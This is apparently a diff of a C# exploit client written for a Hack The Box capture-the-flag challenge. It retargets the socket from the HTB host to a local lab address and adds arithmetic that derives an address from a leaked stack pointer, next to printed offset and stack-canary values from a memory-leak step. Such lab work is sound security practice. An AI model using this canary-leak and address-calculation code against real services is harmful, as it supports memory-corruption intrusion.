@@ -19,14 +19,14 @@ namespace dSocket
     }
     class Program
     {
-        private const string Host = "docker.hackthebox.eu";
-        private const int Port = 46854;
+        private const string Host = "10.0.0.108";
+        private const int Port = 5555;
 
         private static Socket ConnectSocket()
         {
-            IPHostEntry ipHostInfo = Dns.GetHostEntry(Host);
-            IPAddress ipAddress = ipHostInfo.AddressList[0];
-            // IPAddress ipAddress = IPAddress.Parse(Host);
+            //IPHostEntry ipHostInfo = Dns.GetHostEntry(Host);
+            //IPAddress ipAddress = ipHostInfo.AddressList[0];
+            IPAddress ipAddress = IPAddress.Parse(Host);
             IPEndPoint ipe = new IPEndPoint(ipAddress, Port);
 
             Socket mySock = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
@@ -144,6 +144,11 @@ namespace dSocket
             }
 
             Console.WriteLine("\n[-] Offset: {0}\tCanary: {1}\tRSP: {2}", offsetStr, canaryStr, RSPStr);
+            
+            UInt64 thing = (UInt64)new System.ComponentModel.UInt64Converter().ConvertFromString(RSPStr);
+            UInt64 toSub = (UInt64)new System.ComponentModel.UInt64Converter().ConvertFromString("0xe5f");
+            Console.WriteLine("{0} - {1} = {2}", thing, toSub, thing-toSub);
+            Console.WriteLine("{0} = {1}", thing - toSub, string.Format("0x{0:X}", thing - toSub));
 
             return inputBuffer;
         }
